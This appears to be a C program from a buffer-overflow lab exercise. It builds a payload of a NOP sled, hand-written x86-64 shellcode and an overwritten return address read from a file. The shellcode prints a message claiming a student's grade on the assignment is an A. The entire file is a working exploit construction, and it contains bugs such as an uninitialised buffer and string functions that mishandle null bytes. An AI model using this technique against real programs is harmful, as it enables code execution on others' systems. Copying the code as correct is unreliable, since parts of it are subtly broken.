#include <stdio.h>
#include <string.h>
#include <stdint.h>

int main() {
	char buffer[224];

	char shell[] = {0xeb,0x2e,0x41,0x6c,0x69,0x73,0x68,0x61,0x2c,0x20,0x79,0x6f,0x75,0x72,0x20,0x67,0x72,0x61,0x64,0x65,0x20,0x6f,0x6e,0x20,0x74,0x68,0x69,0x73,0x20,0x61,0x73,0x73,0x69,0x67,0x6e,0x6d,0x65,0x6e,0x74,0x20,0x69,0x73,0x20,0x61,0x6e,0x20,0x41,0x20,0x31,0xc0,0xb0,0x01,0x89,0xc7,0x48,0x8d,0x35,0xc5,0xff,0xff,0xff,0x80, 0x6e, 0x2d, 0x16, 0x31,0xd2,0xb2,0x2e,0x0f,0x05,0xb0,0x3c,0x31,0xff,0x0f,0x05};
	
	for (int i=0; i<224-sizeof(shell)-8; i++) {
	char nop[] = {0x90};
	strncat(buffer, nop, 1);
	
	}

	strncat(buffer, shell, sizeof(shell));
	
	unsigned char address[8];
  	FILE *fp = fopen("address.txt","r");
 	fscanf(fp, "%lx", (unsigned long)&address);
 	fclose(fp);
	
	strncat(buffer, address, sizeof(address));
	
	fputs(buffer, stdout);

	return 0;
}